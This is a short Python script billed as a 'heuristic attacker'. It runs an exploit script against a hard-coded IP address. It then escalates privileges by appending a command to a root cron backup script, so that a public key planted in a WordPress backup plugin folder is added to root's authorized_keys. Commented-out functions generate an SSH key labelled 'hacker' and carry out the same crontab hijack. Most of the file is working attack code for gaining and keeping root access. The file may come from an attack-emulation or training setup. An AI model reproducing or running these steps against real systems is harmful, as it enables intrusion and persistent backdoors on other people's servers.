'''
This file implements a heuristic attacker 
'''
import subprocess
from time import sleep
import paramiko 

exploit_command = ['python', 'exploit.py', '-u', 'http://18.117.91.52']
subprocess.run(exploit_command)
sleep(5)
print("exploit successful")

priv_sc_command = r'echo "\nsudo cat /srv/www/wordpress/wp-content/plugins/backup-backup/includes/pub.txt >> /root/.ssh/authorized_keys" >> /var/backup.sh'
subprocess.run(priv_sc_command, shell=True)
print("privilege escalation successful")
sleep(60)

# def generate_ssh_keys(pub_file):
#     private_key = paramiko.RSAKey.generate(bits=2048)

#     public_key = private_key.get_base64()
#     print(public_key)
#     with open(pub_file, 'w') as f:
#         f.write(f"ssh-rsa {public_key} hacker\n")
#     print("pubkey written")

# def exploit_crontab():
#     """
#     returns the location of a private key that can be used to SSH as root
#     or False if unsuccessful
#     """

#     cron_file = "/var/spool/cron/crontabs/root"
#     cron_script = "/var/backup.sh"
#     pub_file = "/tmp/id_rsa.pub"
#     private_key = False
#     # try:
#     with open(cron_file, "r") as f:
#         if not cron_script in f.read():
#             return False

#     private_key = generate_ssh_keys(pub_file)

    # with open(cron_script, "a") as f:
    #     f.write(f"\nsudo cat {pub_file} >> /root/.ssh/authorized_keys\n")

    # # except:
    #     # return False
    
    # print("Cron script modified - waiting 60 seconds for script to be executed")
    # sleep(60)
    # return private_key
